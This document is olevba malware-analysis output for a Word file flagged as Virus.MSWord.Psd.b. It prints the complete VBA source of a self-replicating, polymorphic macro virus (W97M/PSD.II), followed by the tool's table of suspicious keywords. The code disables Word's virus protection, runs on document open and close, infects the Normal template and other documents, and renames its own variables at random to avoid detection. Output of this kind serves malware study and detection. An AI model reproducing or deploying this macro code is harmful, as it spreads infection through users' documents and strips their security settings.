olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Psd.b-dfd29b105f8822c54444f60df41c198db63c39b2
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Psd.b-dfd29b105f8822c54444f60df41c198db63c39b2 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
On Error Resume Next
Options.ConfirmConversions = 0: Options.VirusProtection = 0: Options.SaveNormalPrompt = 0
If Day(Now) = Minute(Now) Then
Randomize: For GI6652 = 1 To (Int(Rnd * 70))
ActiveDocument.Shapes.AddShape(Int(Rnd * 120), Int(Rnd * 200), Int(Rnd * 500), Int(Rnd * 500), Int(Rnd * 500)).Select
Selection.ShapeRange.Fill.ForeColor.RGB = RGB(Int(Rnd * 255), Int(Rnd * 255), Int(Rnd * 255))
Selection.ShapeRange.Fill.Visible = msoTrue
Selection.ShapeRange.Fill.Solid: Next GI6652: End If
BD7757 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
CO8049 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
If Left(ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Pri" Then
Set SU7752 = ActiveDocument.VBProject.VBComponents.Item(1)
MU289 = True
End If
If Left(NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Pri" Then
Set SU7752 = NormalTemplate.VBProject.VBComponents.Item(1)
CQ9554 = True
Call AF850_AI7196
ActiveDocument.Saved = True
End If
If CQ9554 <> True And MU289 <> True Then GoTo ON9847
If CQ9554 = True Then SU7752.CodeModule.AddFromString ("Private Sub Document_Close()" & vbCr & ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, BD7757 - 1) & vbCr & "Sub ViewVBCode()" & vbCr & "Application.Quit SaveChanges:=wdDoNotSaveChanges" & vbCr & "End Sub")
If MU289 = True Then SU7752.CodeModule.AddFromString ("Private Sub Document_Open()" & vbCr & NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, CO8049 - 4))
ON9847:
If CO8049 <> 0 And BD7757 = 0 And (InStr(1, ActiveDocument.Name, "Document") = False) Then
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
ElseIf (InStr(1, ActiveDocument.Name, "Document") <> False) Then
ActiveDocument.Saved = True: End If
End Sub 'W97M/PSD.II ...logically delicious! [(c)1998 ALT-F11 code hack]
Private Function AF850_AI7196()
On Error Resume Next
Randomize
Dim r1(1 To 15) As String
r1(1) = "GL3099": r1(2) = "LD8051": r1(3) = "CB1546": r1(4) = "LG3760": r1(5) = "AI7196": r1(6) = "BD7757"
r1(7) = "CO8049": r1(8) = "MU289":: r1(9) = "SU7752": r1(10) = "CQ9554": r1(11) = "ON9847": r1(12) = "AF850": r1(13) = "FU3120": r1(14) = "DH7425": r1(15) = "GI6652"
For GI6652 = 1 To 15
a1 = (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & Int(Rnd * 100) & Int(Rnd * 100)
Call AI7196(a1, r1(GI6652))
Next GI6652
End Function 'VAMP v1.0 [thanks Vic!]
Private Function AI7196(DH7425, FU3120 As String)
On Error Resume Next
Dim GL3099 As Long: Dim LD8051 As Long: Dim CB1546 As Long: Dim LG3760 As Long
With ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
GL3099 = 1: LD8051 = 1: CB1546 = .CountOfLines: LG3760 = Len(.Lines(.CountOfLines, 1))
Do While .Find(FU3120, GL3099, LD8051, CB1546, LG3760, True)
strline = .Lines(GL3099, 1)
strline = Left(strline, LD8051 - 1) & DH7425 & Mid(strline, LG3760)
.replaceline GL3099, strline
GL3099 = CB1546 + 1: LD8051 = 1:
CB1546 = .CountOfLines
LG3760 = Len(.Lines(.CountOfLines, 1))
Loop
End With
End Function
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

